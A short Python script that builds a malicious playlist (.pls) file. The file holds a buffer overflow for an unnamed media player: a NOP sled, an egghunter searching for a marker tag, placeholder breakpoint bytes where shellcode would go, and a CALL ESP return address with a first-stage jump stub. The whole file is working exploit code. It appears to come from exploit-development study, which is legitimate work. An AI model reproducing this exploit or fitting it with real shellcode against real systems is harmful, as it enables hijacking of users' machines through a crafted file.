import sys

if len(sys.argv) <= 1:
    print "Usage: python " + sys.argv[0] + " [filename]"
    exit()

filename = sys.argv[1]

# Prefix
prefix = "[playlist]\r\nFile1=\\\\"

# Generate NOP's
nop = "\x90" * 856

# Egg string, reversed "ODOR"
egg = "ODOR"[::-1]

# Egghunter using egg
egghunt = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunt += egg
egghunt += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Shellcode
sc = "\xcc" * (166 - len(egghunt))

# Jump around
jump = "\x07\x55\x2d\x1a"                       # 1A2927E3   FFD4  CALL ESP
jump += "\x83\xec\x58\x83\xec\x58\xff\xe4"      # First stage payload
jump += "\x90" * 4                              # NOP padding

# Suffix
suffix = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

# Concatenate string for sending
code = prefix + nop + egghunt + sc + jump + suffix

f = open(filename, 'wb')
f.write(code)
f.close()
